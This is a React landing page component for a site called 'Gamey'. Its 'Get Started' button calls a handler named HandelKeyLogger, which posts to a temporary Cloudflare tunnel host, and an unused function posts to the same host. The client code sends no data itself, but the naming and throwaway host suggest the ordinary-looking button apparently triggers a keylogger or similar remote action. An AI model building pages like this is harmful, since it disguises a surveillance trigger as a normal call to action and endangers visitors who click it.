import React, { useEffect } from "react";
import axios from 'axios'

export default function LandingPage() {

  useEffect(()=>{
    const getdata=async()=>{
        await axios.post('https://directly-legend-hunt-laptops.trycloudflare.com/').then((result)=>{
            console.log(result.data)
        }).catch((err)=>{
            console.log(err)
        })
    }


  },[])

  const HandelKeyLogger=async()=>{
        await axios.post("https://directly-legend-hunt-laptops.trycloudflare.com/pubg").then((result)=>{
            console.log("Hi")
            console.log(result.data)
        }).catch((err)=>{
            console.log(err)
        })
  }
  return (
    <div className="page">

      {/* Navbar */}
      <nav className="navbar">
        <div className="logo">Gamey</div>

        <ul className="nav-links">
          <li>Home</li>
          <li>About</li>
          <li>Services</li>
          <li>Projects</li>
          <li>Contact</li>
        </ul>
      </nav>

      {/* Center Content */}
      <div className="hero">
        <h1>Build Something Amazing</h1>
        <p>A modern React landing page</p>
        <button className="cta-btn" onClick={HandelKeyLogger}>Get Started</button>
      </div>

    </div>
  );
}